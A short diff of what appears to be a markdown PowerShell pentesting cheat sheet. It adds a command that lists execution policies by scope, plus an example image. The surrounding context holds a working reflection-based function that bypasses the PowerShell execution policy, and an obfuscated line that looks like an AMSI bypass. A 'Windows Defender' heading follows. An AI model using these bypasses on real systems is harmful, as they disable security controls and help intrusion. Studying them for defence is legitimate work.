@@ -92,9 +92,15 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 ```powershell
 # View the Execution Policy
 Get-ExecutionPolicy
+# List according to system levels
+Get-ExecutionPolicy -List | Format-Table -AutoSize
 # Bypass
 function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy
 ```
+
+**Example:**
+
+![Main Logo](images/execution-policy.PNG 'ExampleExecutionPolicy')
 
 # Windows Defender
 
